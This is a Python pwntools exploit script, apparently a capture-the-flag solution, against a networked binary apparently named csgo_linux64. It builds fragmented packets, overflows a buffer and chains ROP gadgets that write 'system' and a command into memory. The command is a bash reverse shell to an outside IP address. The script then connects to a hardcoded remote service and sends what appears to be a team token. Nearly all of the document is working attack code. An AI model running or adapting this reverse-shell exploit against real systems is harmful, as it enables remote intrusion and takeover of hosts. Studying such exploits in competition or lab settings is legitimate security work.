from pwn import *

context.log_level = 'debug'


def carry_around_add(a, b):
    c = a + b
    return (c & 0xffff) + (c >> 16)


def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i + 1]) << 8)
        s = carry_around_add(s, w)
    return ~s & 0xffff


def makePack(payload, length, off, islast):
    pack = bytearray()
    pack += chr(4 + (5 << 4))
    pack += 'a'
    pack += p16(length)
    pack += 'aa'
    pack += p16((4 if islast else 0) + off)
    pack += chr(64)
    pack += chr(17)
    pack += p16(0)
    pack += 'a' * 8
    crc = checksum(str(pack))
    pack[10:12] = p16(crc)
    pack += 'a'*4
    pack += payload
    print 'asd'
    return str(pack)
    
def add(addr, value):
    payload = ''
    payload += p64(0x0000000000400758)      # pop rax ; pop rbx ; pop rbp ; ret
    payload += p64(addr-0x5b)
    payload += p64(value)
    payload += 'aaaaaaaa'


    payload += p64(0x0000000000400757)      # add dword ptr [rax + 0x5b], ebx ; pop rbp ; ret
    payload += 'aaaaaaaa'
    return payload
rop = ''
rop += add(0x600e60, u32('syst'))
rop += add(0x600e60+4, u32('em\x00\x00'))

cmd = 'bash -c "bash -i >& /dev/tcp/121.42.25.113/12333 0>&1"\x00\x00'
#cmd = "gnome-calculator\x00\x00\x00\x00"
for i in range(len(cmd)/4):
    a = cmd[:4]
    cmd = cmd[4:]
    rop += add(0x600f00+i*4, u32(a))

rop += add(0x600bf8, 340)       # puts@got -> pop ret

rop += p64(0x4006a9)        # clean rdi

rop += p64(0x0000000000400758)      # pop rax ; pop rbx ; pop rbp ; ret
rop += p64(0x0000000000400758)
rop += p64(0)
rop += 'aaaaaaaa'

rop += p64(0x40068c)                # pop r12 ; pop rbp ; jmp rax
rop += p64(0x600e60)
rop += 'aaaaaaaa'

# pop rax ; pop rbx ; pop rbp ; ret
rop += p64(0x400640)
rop += p64(0)
rop += 'aaaaaaaa'
rop += p64(0x400686)                # mov edi,ebx ; pop rbx ; mov rsi,r12 ; pop r12 ; pop rbp ; jmp eax
rop += 'aaaaaaaa'
rop += 'aaaaaaaa'
rop += 'aaaaaaaa'

rop += p64(0x4006a9)                # clean rdi
rop += p64(0x0000000000400759)      # pop rbx ; pop rbp ; ret
rop += p64(0x600f00)
rop += 'aaaaaaaa'
rop += p64(0x400686)

def make(payload):
    p = []
    length = len(payload)
    off = 0
    while payload != '':
        data = payload[:0x100]
        payload = payload[0x100:]
        islast = True
        if payload == '':
            islast = False
        p.append(makePack(data, length, off, islast))
        off += len(data)
    return p


def sendP(data):
    d = ''
    d += p32(len(data))
    d += data
    return d


#target = process('LD_PRELOAD=./libtcmalloc_minimal.so.0 ./csgo_linux64', shell=True)
target = remote('47.100.64.171', 20000)

target.recvline()
time.sleep(0.5)
target.sendline('79DC7rePzwA6MEC1dwoloOYpbP10IMzG')
import time
time.sleep(0.5)
payload = "a"*0x3048 + rop

payloads = make(payload)
for p in payloads:
    time.sleep(0.5)
    target.send(sendP(p))

target.interactive()
